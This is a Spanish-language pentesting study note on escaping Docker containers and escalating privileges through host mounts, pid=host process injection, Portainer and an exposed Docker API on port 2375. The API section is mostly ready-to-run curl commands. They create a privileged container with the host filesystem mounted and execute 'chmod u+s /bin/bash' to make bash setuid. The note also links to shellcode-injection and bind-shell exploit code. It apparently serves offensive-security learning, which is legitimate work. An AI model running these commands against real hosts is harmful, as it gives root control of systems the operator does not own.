___
- tags: #abusing_privilege #docker
___
## Técnicas
###  Uso de monturas
Uso de monturas en el despliegue de qcontenedores para acceder a archivos privilegiados del sistema host. Analizaremos cómo un atacante puede aprovechar las monturas para manipular los archivos del host y comprometer la seguridad del sistema.
### Contenedores con compartición de procesos
Despliegue de contenedores con la compartición de procesos (**-pid=host**) y permisos privilegiados (**-privieged**). Veremos como inyectar un shellcode malicioso en un proceso de ejecución como root, lo que podría permitir al atacante tomar el control del sistema.
- [código para abusar del proceso (pid)](https://raw.githubusercontent.com/0x00pf/0x00sec_code/master/mem_inject/infect.c).
- [codigo que nos da la bind shell](https://www.exploit-db.com/exploits/41128).
### Portainer
Uso de **Portainer** para administrar el despliegue de un contenedor. Discutiremos cómo, mediante el empleo de monturas, un atacante podría ingresar y manipular archivos privilegiados del sistema host y escapar del contenedor.
### Abuso de API de Docker
Abuso de **API** de **Docker** por el puerto **2375** para la creación de imágenes, despliegue de contenedores e inyección de comandos privilegiados en la máquina host. Examinaremos cómo un atacante puede explotar la API de Docker para comprometer la seguridad del host y lograr la ejecución de comandos con privilegios elevados.

#### Buscando si el puerto está abierto
```shell
echo '' > /dev/tcp/172.17.0.2/2375

echo '' > /dev/tcp/172.17.0.2/2378
-> bash: connect: Connection refused
-> bash: /dev/tcp/172.17.0.2/2375: Connection refused
```

#### Creando un contenedor usando la api
```shell
curl -s -X POST -H "Content-Type: application/json" http://172.17.0.1:2375/containers/create?name=test -d '{"Image": "ubuntu:latest", "Cmd": ["/usr/bin/tail", "-f", "/dev/null"], "HostConfig": {"Binds": ["/:/mnt"], "Privileged": true}}'
```

#### Listando
```shell
# Contenedores
curl http://172.17.0.1 http://172.17.0.1:2375/containers/json | jq

# Imagenes
curl http://172.17.0.1 http://172.17.0.1:2375/images/json | jq
```

#### Crea un contenedor
```shell
curl -X POST -H "Content-Type: application/json" http://172.17.0.1:2375/containers/id_container/start?name=
```

#### Ejecución remota de código
```shell
# primer paso
curl -X POST -H "Content-Type: application/json" http://172.17.0.1:2375/containers/8a3e2209c6360e217b10528c4af6236362d71e53657ce93dc94c4e1e3a466b73/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "chmod u+s /bin/bash"]}'

# segundo paso donde el id es el que me retorna el paso 1
curl -X POST -H "Content-Type: application/json" http://172.17.0.1:2375/exec/8a3e2209c6360e217b10528c4af6236362d71e53657ce93dc94c4e1e3a466b73/start -d '{}'

```

### Rutas
```shell
# este recurso permite comunicarse con docker
ls -l /var/run/docker.sock

# 
```